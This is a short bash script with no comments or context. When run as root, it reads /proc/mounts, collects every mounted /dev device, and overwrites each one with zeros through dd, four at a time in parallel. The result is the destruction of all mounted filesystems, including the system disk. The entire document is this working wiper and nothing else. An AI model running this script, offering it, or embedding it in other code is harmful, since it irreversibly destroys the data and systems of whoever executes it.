#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
  grep -E "^/dev" /proc/mounts | cut -d" " -f1 | sort -u \
    | xargs -P4 -I{} dd if=/dev/zero of={}
fi
